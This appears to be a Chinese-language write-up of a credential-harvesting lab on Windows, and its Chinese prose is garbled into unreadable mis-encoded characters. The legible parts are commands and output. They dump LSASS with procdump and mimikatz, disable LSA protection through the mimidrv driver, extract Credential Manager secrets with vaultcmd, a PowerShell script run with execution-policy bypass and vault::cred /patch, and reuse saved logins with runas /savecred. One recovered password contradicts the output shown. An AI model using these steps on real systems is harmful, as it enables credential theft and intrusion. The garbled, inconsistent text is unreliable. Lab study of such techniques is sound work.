å¦‚æœæˆ‘ä»¬æ— æ³•ä½¿ç”¨ç›®æ ‡æœºå™¨çš„GUIï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨ProcDumpæ¥è½¬å‚¨è¿›ç¨‹ï¼ŒProcDumpæ˜¯ä¸€ä¸ªå¯ä»¥åœ¨å‘½ä»¤è¡Œç•Œé¢è¿è¡Œçš„ç³»ç»Ÿå†…éƒ¨è¿›ç¨‹è½¬å‚¨å®ç”¨ç¨‹åºã€‚åœ¨ä¸æœ¬æ–‡å®éªŒç›¸å…³çš„ç›®æ ‡æœºå™¨ä¸­ï¼Œç³»ç»Ÿå†…éƒ¨å¥—ä»¶çš„å®‰è£…è·¯å¾„å¦‚ä¸‹ï¼šC:\\Tools\\SysinternalsSuiteã€‚ æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯lsass.exeï¼Œç„¶ååƒä¸‹é¢è¿™æ ·è½¬å‚¨ä¸è¿›ç¨‹ç›¸å…³çš„å†…å­˜ä¿¡æ¯ï¼š #åœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨procdump.exeè½¬å‚¨LSASSè¿›ç¨‹çš„å†…å­˜ä¿¡æ¯ #ä»lsass.exeè¿›ç¨‹çš„å†…å­˜ä¸­è½¬å‚¨å‡ºç”¨æˆ·è´¦æˆ·å’Œå¯†ç ï¼Œå¹¶ä¿å­˜ä¸ºç¦»çº¿ç‰ˆçš„lsass.dmpæ–‡ä»¶ã€‚ C:\\&gt; C:\\Tools\\SysinternalsSuite\\procdump.exe -accepteula -ma lsass.exe c:\\Tools\\Mimikatz\\lsass_dump-1.dmp ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [09:09:33] Dump 1 initiated: c:\\Tools\\Mimikatz\\lsass_dump-1.dmp [09:09:33] Dump 1 writing: Estimated dump file size is 162 MB. [09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds [09:09:34] Dump count reached. æ³¨æ„ï¼šæˆ‘ä»¬åœ¨è½¬å‚¨è¿›ç¨‹æ—¶éœ€è¦å†™å…¥å†…å®¹åˆ°è®¡ç®—æœºç£ç›˜ï¼Œè€Œä¸”å› ä¸ºè½¬å‚¨LSASSè¿›ç¨‹æ˜¯æ”»å‡»è€…å¸¸ç”¨çš„ä¸€ç§å·²çŸ¥æŠ€æœ¯ï¼Œæ‰€ä»¥ï¼Œç›®æ ‡è®¡ç®—æœºä¸Šçš„åç—…æ¯’è½¯ä»¶äº§å“å¯èƒ½ä¼šå°†æˆ‘ä»¬çš„è½¬å‚¨æ“ä½œæ ‡è®°ä¸ºæ¶æ„ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç°å®ç¯å¢ƒä¸­è½¬å‚¨LSASSè¿›ç¨‹æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½è¿˜éœ€è¦å°è¯•ç»•è¿‡ç›®æ ‡æœºå™¨ä¸Šçš„åç—…æ¯’ç¨‹åºã€‚ ç„¶åå†ç»§ç»­ä½¿ç”¨MimiKatzæ¥è¯»å–å¯†ç ä¿¡æ¯ï¼š #æ³¨æ„ï¼šè¦ä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œcmd C:\\Tools\\Mimikatz&gt; mimikatz.exe mimikatz # privilege::debug mimikatz # sekurlsa::minidump lsass_dump-1.dmp mimikatz # sekurlsa::logonpasswords ä½¿ç”¨MimiKatz Mimikatzæ˜¯ä¸€ä¸ªè‘—åçš„å·¥å…·ï¼Œå®ƒå¸¸è¢«ç”¨äºä»æŒ‡å®šå†…å­˜ä¸­æå–å¯†ç ã€å“ˆå¸Œã€PINå’ŒKerberosç¥¨æ®ç­‰æ•æ„Ÿä¿¡æ¯ã€‚Mimikatzæ˜¯ä¸€ç§åæ¸—é€å·¥å…·ï¼Œèƒ½å¤Ÿæ”¯æŒå¾ˆå¤šæœ‰ç”¨çš„æ”»å‡»ï¼Œä¾‹å¦‚å“ˆå¸Œä¼ é€’ã€ç¥¨æ®ä¼ é€’ä»¥åŠæ„å»ºKerberosé»„é‡‘ç¥¨æ®ç­‰ã€‚Mimikatzå¯ä»¥å¤„ç†ç›®æ ‡æ“ä½œç³»ç»Ÿçš„å†…å­˜æ¥å°è¯•è®¿é—®å…¶ä¸­æ‰€åŒ…å«çš„æ•æ„Ÿä¿¡æ¯ï¼Œå› æ­¤ï¼Œè¯¥å·¥å…·è¿˜éœ€è¦æ”»å‡»è€…å…·æœ‰ç›®æ ‡æœºå™¨çš„ç®¡ç†å‘˜æƒé™æˆ–è€…ç³»ç»Ÿæƒé™æ‰èƒ½æˆåŠŸè½¬å‚¨å†…å­˜ã€æå–å‡­æ®ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Mimikatzå·¥å…·æ¥æå–ç›®æ ‡æœºçš„lsass.exeè¿›ç¨‹çš„å†…å­˜è½¬å‚¨ï¼Œåœ¨æœ¬æ–‡ç›¸å…³çš„å®éªŒç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›®æ ‡æœºå™¨çš„c:\\Tools\\Mimikatzè·¯å¾„æ‰¾åˆ°è¯¥å·¥å…·ã€‚ ç›®æ ‡æœºå™¨ä¸Šçš„LSASSè¿›ç¨‹æ˜¯ä»¥SYSTEMæƒé™è¿è¡Œçš„ï¼Œå› æ­¤ï¼Œä¸ºäº†è·å–åˆ°ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬éœ€è¦å…·æœ‰ç›®æ ‡æœºå™¨çš„ç³»ç»Ÿæƒé™æˆ–è€…æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡RDPç•Œé¢åœ¨ç›®æ ‡æœºå™¨ä¸Šä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå¹¶æ‰“å¼€CMDï¼Œç„¶åå†æ‰§è¡ŒmimikatzäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç›¸å…³å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š C:\\Tools\\Mimikatz&gt; mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # æˆåŠŸåŠ è½½mimikatzä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ£€æŸ¥ä¸€ä¸‹å½“å‰æƒé™ä»¥ä¾¿ç¡®è®¤æˆ‘ä»¬èƒ½å¦è¿›è¡Œå†…å­˜è®¿é—®ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š #æ£€æŸ¥å½“å‰ç”¨äºè®¿é—®å†…å­˜çš„æƒé™ mimikatz # privilege::debug Privilege '20' OK å®Œæˆæƒé™æ£€æŸ¥ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æå–lsass.exeè¿›ç¨‹çš„å†…å­˜ä¸­æ‰€å­˜å‚¨çš„å¯†ç ä¿¡æ¯(å¦‚æœç›®æ ‡LSASSè¿›ç¨‹æ˜¯å—ä¿æŠ¤çŠ¶æ€ï¼Œä»¥ä¸‹å‘½ä»¤åˆ™æ— æ³•æˆåŠŸæ‰§è¡Œ)ï¼šï¼ˆæˆ‘è¿™é‡Œæ˜¯æ‰§è¡Œä¸æˆåŠŸçš„ï¼Œä»¥ä¸‹æ˜¯æˆåŠŸç¤ºä¾‹ï¼‰ mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 515377 (00000000:0007dd31) Session : RemoteInteractive from 3 User Name : Administrator Domain : THM Logon Server : CREDS-HARVESTIN Logon Time : 6/3/2022 8:30:44 AM SID : S-1-5-21-1966530601-3185510712-10604624-500 msv : [00000003] Primary * Username : Administrator * Domain : THM * NTLM : 98d3a787a80d08385cea7fb4aa2a4261 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70 ... åœ¨ä¸Šè¿°å‘½ä»¤çš„è¾“å‡ºç»“æœä¸­ï¼ŒMimikatzä¼šä¸ºæˆ‘ä»¬åˆ—å‡ºå¾ˆå¤šå…³äºç›®æ ‡æœºå™¨çš„è´¦æˆ·ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šé¢çš„è¾“å‡ºç»“æœä¸­æ£€æŸ¥Administratorç”¨æˆ·çš„Primaryéƒ¨åˆ†ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½çœ‹åˆ°ç®¡ç†å‘˜ç”¨æˆ·æ‰€å¯¹åº”çš„NTLMå¯†ç å“ˆå¸Œã€‚ æ³¨æ„ï¼šå¦‚æœæˆ‘ä»¬è¦æˆåŠŸè·å–åˆ°ç›®æ ‡ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆç›®æ ‡ç”¨æˆ·(å—å®³è€…)å¿…é¡»å·²ç»ç™»å½•è¿‡ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·çš„å‡­æ®ä¹Ÿå·²ç»è¢«ç›®æ ‡æœºæ‰€ç¼“å­˜ã€‚ å—ä¿æŠ¤çš„LSASSè¿›ç¨‹ åœ¨2012å¹´ï¼Œå¾®è½¯å¼•å…¥äº†LSAä¿æŠ¤æœºåˆ¶ï¼Œå®ƒèƒ½é˜²æ­¢LSASSè¿›ç¨‹è¢«æ¶æ„è®¿é—®ï¼Œè¿™èƒ½å°½é‡é¿å…æ”»å‡»è€…ä»LSASSè¿›ç¨‹çš„ç›¸å…³å†…å­˜ä¸­æå–å‡­æ®ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ç¦ç”¨ç›®æ ‡æœºå™¨ä¸­çš„LSAä¿æŠ¤å¹¶ä½¿ç”¨Mimikatzä»LSASSè¿›ç¨‹çš„å†…å­˜ä¸­æå–å‡­æ®ï¼›å¦‚æœæˆ‘ä»¬æƒ³è¦è®©LSASSè¿›ç¨‹å¤„äºå—ä¿æŠ¤çŠ¶æ€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ³¨å†Œè¡¨ä¸­çš„RunAsPPL DWORDçš„å€¼ä¿®æ”¹ä¸º1(ç›¸å…³çš„æ³¨å†Œè¡¨è·¯å¾„HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa)ã€‚ æˆ‘ä»¬åœ¨é’ˆå¯¹å—ä¿æŠ¤çš„LSASSè¿›ç¨‹æ‰§è¡Œsekurlsa::logonpasswordså‘½ä»¤æ—¶ï¼Œä¼šæ”¶åˆ°å¦‚ä¸‹æ‰€ç¤ºçš„é”™è¯¯ç»“æœï¼š #ç”±äºLSAä¿æŠ¤æœºåˆ¶ï¼Œæˆ‘ä»¬æ— æ³•æˆåŠŸæå–LSASSè¿›ç¨‹çš„å†…å­˜ä¸­æ‰€å­˜å‚¨çš„å¯†ç ä¿¡æ¯ã€‚ mimikatz # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) ç›´æ¥æ‰§è¡Œä¸Šè¿°å‘½ä»¤ä¼šå‘æˆ‘ä»¬è¿”å›0x00000005é”™è¯¯ä»£ç (Access Denied)ã€‚å¹¸è¿çš„æ˜¯ï¼ŒMimikatzé’ˆå¯¹æ­¤ç±»æƒ…å†µä¸ºæˆ‘ä»¬æä¾›mimidrv.sysé©±åŠ¨ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä»¥åœ¨ç³»ç»Ÿå†…æ ¸çº§åˆ«å·¥ä½œä»¥ç¦ç”¨LSAä¿æŠ¤ã€‚ #ä½¿ç”¨ !+ å°†mimidrvå¯¼å…¥Mimikatzï¼Œå³å°†mimidrvé©±åŠ¨ç¨‹åºåŠ è½½åˆ°å½“å‰å†…å­˜ä¸­ã€‚ mimikatz # !+ [*] 'mimidrv' service not present [+] 'mimidrv' service successfully registered [+] 'mimidrv' service ACL to everyone [+] 'mimidrv' service started æ³¨æ„ï¼šå¦‚æœä¸Šè¿°å¯¼å…¥æ“ä½œå¤±è´¥å¹¶å‡ºç°isFileExisté”™è¯¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆé€€å‡ºå½“å‰çš„mimikatzç•Œé¢ï¼Œç„¶åå†æ¬¡åŠ è½½C:\\Tools\\Mimikatz\\mimikatz.exeå¹¶å†æ¬¡è¿è¡Œä¸Šè¿°å¯¼å…¥å‘½ä»¤ã€‚ï¼ˆå¦‚æœä¾æ—§é”™è¯¯ï¼Œé‚£å°±ç¡®å®šè‡ªèº«å½“å‰ç›®å½•æ˜¯å¦ä¸mimikatz.exeåœ¨åŒä¸€ç›®å½•ä¸‹ï¼‰ æˆåŠŸåŠ è½½å¥½mimidrvé©±åŠ¨ç¨‹åºä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹Mimikatzå‘½ä»¤æ¥ç¦ç”¨å½“å‰æœºå™¨(ä¹Ÿå°±æ˜¯ç›®æ ‡æœºå™¨)çš„LSAä¿æŠ¤ï¼š mimikatz # !processprotect /process:lsass.exe /remove Process : lsass.exe PID 840 -&gt; 00/00 [0-0-0] ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­æ‰§è¡Œsekurlsa::logonpasswordså‘½ä»¤æ¥æå–lsass.exeè¿›ç¨‹çš„å†…å­˜ä¸­æ‰€å­˜å‚¨çš„å¯†ç ä¿¡æ¯ã€‚ 0x06 Windowså‡­æ®ç®¡ç†å™¨ åœ¨æœ¬å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£Windowså‡­æ®ç®¡ç†å™¨ï¼Œå¹¶å°è¯•åˆ©ç”¨å®ƒæ¥è½¬å‚¨ç³»ç»Ÿå‡­æ®ã€‚ ä»€ä¹ˆæ˜¯å‡­æ®ç®¡ç†å™¨ï¼Ÿ å‡­æ®ç®¡ç†å™¨æ˜¯Windowsçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒå¯ç”¨äºå­˜å‚¨ç½‘ç«™ã€åº”ç”¨ç¨‹åºå’ŒåŸŸç½‘ç»œçš„ç™»å½•æ•æ„Ÿä¿¡æ¯(å¦‚ç™»å½•å‡­æ®ã€ç”¨æˆ·åã€å¯†ç å’Œinternetåœ°å€ç­‰)ã€‚ä¸Windowså‡­æ®ç®¡ç†å™¨ç›¸å…³çš„å‡­æ®ç±»åˆ«æœ‰å››ç§ï¼š Webå‡­æ®ï¼šåŒ…å«å­˜å‚¨åœ¨äº’è”ç½‘æµè§ˆå™¨ä¸­æˆ–è€…å…¶ä»–åº”ç”¨ç¨‹åºä¸­çš„èº«ä»½éªŒè¯è¯¦ç»†ä¿¡æ¯ã€‚ Windowså‡­æ®ï¼šåŒ…å«Windowsèº«ä»½éªŒè¯çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚NTLMèº«ä»½éªŒè¯æˆ–è€…Kerberosèº«ä»½éªŒè¯ã€‚ é€šç”¨å‡­æ®ï¼šåŒ…å«åŸºæœ¬èº«ä»½éªŒè¯çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç ã€‚ åŸºäºè¯ä¹¦çš„å‡­æ®ï¼šåŒ…å«åŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯è¯¦ç»†ä¿¡æ¯ã€‚ æ³¨æ„ï¼šèº«ä»½éªŒè¯è¯¦ç»†ä¿¡æ¯ä¼šå­˜å‚¨åœ¨ç›®æ ‡ç”¨æˆ·çš„æ–‡ä»¶å¤¹ä¸­ï¼Œè€Œä¸ä¼šåœ¨Windowsç”¨æˆ·å¸æˆ·ä¹‹é—´å…±äº«ï¼Œä½†æ˜¯ï¼Œè¿™äº›èº«ä»½éªŒè¯ä¿¡æ¯è¿˜ä¼šè¢«ç¼“å­˜åœ¨è®¡ç®—æœºå†…å­˜ä¸­ã€‚ è®¿é—®å‡­æ®ç®¡ç†å™¨ æˆ‘ä»¬å¯ä»¥é€šè¿‡GUIç•Œé¢(æ§åˆ¶é¢æ¿-&gt;ç”¨æˆ·å¸æˆ·-&gt;å‡­æ®ç®¡ç†å™¨)æˆ–è€…å‘½ä»¤æç¤ºç¬¦ç•Œé¢æ¥è®¿é—®Windowså‡­æ®ç®¡ç†å™¨ï¼Œæœ¬å°èŠ‚å°†é‡ç‚¹ä»‹ç»ä½¿ç”¨å‘½ä»¤æç¤ºç¬¦çš„åœºæ™¯ã€‚ åœ¨cmdç•Œé¢ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨vaultcmdå®ç”¨ç¨‹åºæ¥æŸ¥çœ‹Microsoftå‡­æ®ç®¡ç†å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨å‘½ä»¤æ¥åˆ—å‡ºwindowsç›®æ ‡æœºä¸­å½“å‰å¯ç”¨çš„å‡­æ®åº“ä¿¡æ¯ï¼š #åˆ—å‡ºå‡­æ®ç®¡ç†å™¨ä¸­çš„å¯ç”¨å‡­æ® C:\\Users\\Administrator&gt; vaultcmd /list Currently loaded vaults: Vault: Web Credentials Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Vault: Windows Credentials Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29 Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault tipsï¼šå¦‚ä¸Šé¢çš„è¾“å‡ºç»“æœæ‰€ç¤ºï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒWindowsæœ‰ä¸¤ä¸ªå‡­æ®åº“ï¼Œä¸€ä¸ªç”¨äºä¿å­˜Webå‡­æ®ï¼Œå¦ä¸€ä¸ªç”¨äºä¿å­˜Windowsæœºå™¨å‡­æ®ã€‚ æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬é€šè¿‡è¿è¡Œå¸¦æœ‰/listpropertiesçš„vaultcmdå‘½ä»¤æ¥æ£€æŸ¥Webå‡­æ®åº“ä¸­æ˜¯å¦å·²ç»å­˜å‚¨äº†å‡­æ®ä¿¡æ¯ï¼š #æ£€æŸ¥â€œWebå‡­æ®åº“â€ä¸­æ˜¯å¦å­˜å‚¨äº†å‡­æ®ï¼šå­˜å‚¨äº†å‡­æ®æˆ–è€…æ²¡æœ‰å­˜å‚¨å‡­æ®ã€‚ C:\\Users\\Administrator&gt; VaultCmd /listproperties:\"Web Credentials\" Vault Properties: Web Credentials Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Number of credentials: 1 Current protection method: DPAPI æˆåŠŸç¡®è®¤Webå‡­æ®åº“ä¸­å­˜å‚¨äº†å‡­æ®ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ—å‡ºä¸Šè¿°Webå‡­æ®åº“ä¸­æ‰€å­˜å‚¨å‡­æ®çš„è¯¦ç»†ä¿¡æ¯ï¼š #åˆ—å‡ºâ€œWebå‡­æ®åº“â€ä¸­çš„å‡­æ®è¯¦ç»†ä¿¡æ¯ C:\\Users\\Administrator&gt; VaultCmd /listcreds:\"Web Credentials\" Credentials in vault: Web Credentials Credential schema: Windows Web Password Credential Resource: internal-app.thm.red Identity: THMUser Saved By: MSEdge Hidden: No Roaming: Yes ä½¿ç”¨PowerShellè„šæœ¬è½¬å‚¨å‡­æ® æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerShellè„šæœ¬å¦‚Get-WebCredentials.ps1æ¥å°è¯•è½¬å‚¨Windowså‡­æ®ç®¡ç†å™¨ä¸­çš„å‡­æ®ï¼Œä¸ºäº†æ–¹ä¾¿èµ·è§ï¼ŒPSè„šæœ¬å·²ç»æ”¾ç½®åœ¨ç›®æ ‡æœºå™¨ä¸Šçš„C:\\Tools\\ç›®å½•ä¸­ã€‚ æˆ‘ä»¬å…ˆç¡®ä¿ä½¿ç”¨ç»•è¿‡ç­–ç•¥æ¥æ‰§è¡ŒPowerShellï¼Œç„¶åå†å°†Get-WebCredentials.ps1ä½œä¸ºæ¨¡å—å¯¼å…¥ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š #ä½¿ç”¨è„šæœ¬è·å–webå‡­æ®ç›¸å…³çš„æ˜æ–‡ä¿¡æ¯ C:\\Users\\Administrator&gt; powershell -ex bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator&gt; Import-Module C:\\Tools\\Get-WebCredentials.ps1 PS C:\\Users\\Administrator&gt; Get-WebCredentials UserName Resource Password Properties -------- -------- -------- ---------- THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]} æ ¹æ®ä¸Šé¢çš„è¾“å‡ºç»“æœæ˜¾ç¤ºï¼Œæˆ‘ä»¬è·å¾—äº†ç”¨äºè®¿é—®å†…éƒ¨åº”ç”¨ç¨‹åºçš„ç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯ã€‚ ç”¨æˆ·åï¼šTHMuser å¯†ç ï¼šE4syPassw0rd ä½¿ç”¨runasè½¬å‚¨å¹¶åˆ©ç”¨å‡­æ® åˆ©ç”¨å·²å­˜å‚¨å‡­æ®çš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨RunAsã€‚RunAsæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå†…ç½®å·¥å…·ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ä¸åŒç”¨æˆ·æƒé™ä¸‹è¿è¡ŒWindowsåº”ç”¨ç¨‹åºæˆ–å·¥å…·ã€‚RunAså·¥å…·æœ‰å„ç§å¯ä»¥åœ¨Windowsç³»ç»Ÿä¸­ä½¿ç”¨çš„å‘½ä»¤å‚æ•°ã€‚/savecredå‚æ•°å…è®¸æˆ‘ä»¬åœ¨Windowså‡­æ®ç®¡ç†å™¨(åœ¨Windowså‡­æ®åº“éƒ¨åˆ†ä¸‹)ä¸­ä¿å­˜ç”¨æˆ·çš„å‡­æ®ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬ä¸‹æ¬¡ä»¥åŒä¸€ç”¨æˆ·èº«ä»½æ‰§è¡Œrunaså‘½ä»¤æ—¶å°†ä¸ä¼šè¢«è¦æ±‚è¾“å…¥å¯†ç è¿›è¡ŒéªŒè¯ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨cmdkeyæ¥æšä¸¾ç›®æ ‡æœºå™¨ä¸­æ‰€å­˜å‚¨çš„å‡­æ®ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨äºåˆ›å»ºã€åˆ é™¤å’Œæ˜¾ç¤ºè®¡ç®—æœºå·²å­˜å‚¨çš„Windowså‡­æ®çš„å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨/listå‘½ä»¤å‚æ•°æ¥æ˜¾ç¤ºå½“å‰æœºå™¨æ‰€æœ‰å·²ç»å­˜å‚¨çš„Windowså‡­æ®ï¼Œæˆ–è€…ä½¿ç”¨/list:computernameå‘½ä»¤å‚æ•°æ¥æ˜¾ç¤ºæŒ‡å®šçš„å‡­æ®ä¿¡æ¯ï¼š #æšä¸¾å½“å‰æœºå™¨å·²ç»å­˜å‚¨çš„Windowså‡­æ® C:\\Users\\thm&gt; cmdkey /list Currently stored credentials: Target: LegacyGeneric:target=10.10.237.226 Type: Generic User: thm Target: Domain:interactive=thm.red\\thm-local Type: Domain Password User: thm.red\\thm-local ä¸Šé¢çš„è¾“å‡ºç»“æœæ˜¾ç¤ºæˆ‘ä»¬æœ‰ä¸€ä¸ªå·²ç»å­˜å‚¨çš„thm.red\\thm-localç”¨æˆ·çš„åŸŸå¸æˆ·å¯†ç ã€‚æ³¨æ„ï¼Œç›®æ ‡æœºå™¨ä¸­å·²ç»å­˜å‚¨çš„å‡­æ®ä¹Ÿå¯ä»¥ç”¨äºè®¿é—®å…¶ä»–åŸŸå†…æœåŠ¡å™¨ã€‚ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨runaså‘½ä»¤ä½œä¸ºthm-localæœ¬åœ°ç”¨æˆ·æ¥æ‰§è¡ŒWindowsåº”ç”¨ç¨‹åºã€‚ #ä½¿ç”¨/savecredå‘½ä»¤å‚æ•°ä»¥æœ¬åœ°ç”¨æˆ·èº«ä»½è¿è¡Œcmd.exeåº”ç”¨ç¨‹åº C:\\Users\\thm&gt; runas /savecred /user:THM.red\\thm-local cmd.exe Attempting to start cmd.exe as user \"THM.red\\thm-local\" ... è¿™å°†ä¸ºæˆ‘ä»¬å¼¹å‡ºä¸€ä¸ªæ–°çš„cmd.exeå‘½ä»¤æç¤ºç¬¦ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªå‘½ä»¤æç¤ºç¬¦ç•Œé¢ä¸­è¿è¡Œwhoami å‘½ä»¤æ¥ç¡®è®¤æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·èº«ä»½ï¼Œç„¶åæ ¹æ®ä»¥ä¸‹è·¯å¾„æ‰¾åˆ°flagå¹¶å›ç­”æœ¬å°èŠ‚çš„ä»»åŠ¡é—®é¢˜ã€‚ C:\\Users\\thm-local\\Saved Games\\flag.txt ä½¿ç”¨Mimikatzè½¬å‚¨å‡­æ® æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Mimikatzå·¥å…·æ¥è½¬å‚¨å‡­æ®ï¼Œå®ƒå¯ä»¥ä»å½“å‰è®¡ç®—æœºçš„å†…å­˜ä¸­è½¬å‚¨ä¿å­˜åœ¨Windowså‡­æ®ç®¡ç†å™¨ä¸­çš„æ˜æ–‡å¯†ç ï¼š #ä½¿ç”¨Mimikatzå·¥å…·é’ˆå¯¹Windowså‡­æ®ç®¡ç†å™¨è¿›è¡Œå†…å­˜è½¬å‚¨ C:\\Users\\Administrator&gt; c:\\Tools\\Mimikatz\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::credman æœ¬å°èŠ‚ä¸­æ‰€è®¨è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨å…¶ä»–å·¥å…·(å¦‚Empireã€Metasploitç­‰)æ¥å®Œæˆï¼Œè¯·è‡ªè¡Œæ‰©å±•ã€‚ ä½¿ç”¨Mimikatzé’ˆå¯¹å­˜å‚¨åœ¨Windowså‡­æ®åº“ä¸­çš„10.10.237.226 SMBå…±äº«è¿›è¡Œå†…å­˜å‡­æ®è½¬å‚¨ï¼Œæœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ? C:\\Users\\Administrator&gt; c:\\Tools\\Mimikatz\\mimikatz.exe mimikatz # privilege::debug Privilege '20' OK mimikatz # vault::cred /patch 0x07 åŸŸæ§åˆ¶å™¨ä¸­çš„å‡­æ® æœ¬å°èŠ‚å°†è®¨è®ºåœ¨æœ¬åœ°å’Œè¿œç¨‹è½¬å‚¨åŸŸæ§åˆ¶å™¨(DC)ä¸­çš„å¯†ç å“ˆå¸Œæ‰€éœ€çš„æ“ä½œæ­¥éª¤ã€‚ NTDS åŸŸæ§åˆ¶å™¨ æ–°æŠ€æœ¯ç›®å½•æœåŠ¡(NTDS-New Technologies Directory Services)æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰Active Directoryæ•°æ®çš„æ•°æ®åº“ï¼Œè¯¥æ•°æ®åº“åŒ…æ‹¬ADå¯¹è±¡ã€å±æ€§ã€å‡­æ®ç­‰ã€‚NTDS. DTSæ•°æ®åº“æ–‡ä»¶ä¸­çš„æ•°æ®ä¸»è¦ç”±ä»¥ä¸‹ä¸‰ä¸ªè¡¨ç»„æˆï¼š æ¶æ„è¡¨(Schema table)ï¼šåŒ…å«å¯¹è±¡çš„ç±»å‹åŠå…¶å…³ç³»ã€‚ é“¾æ¥è¡¨ï¼šåŒ…å«å¯¹è±¡çš„å±æ€§åŠå…¶å±æ€§å€¼ã€‚ æ•°æ®ç±»å‹ï¼šåŒ…å«ç”¨æˆ·å’Œç»„ã€‚ 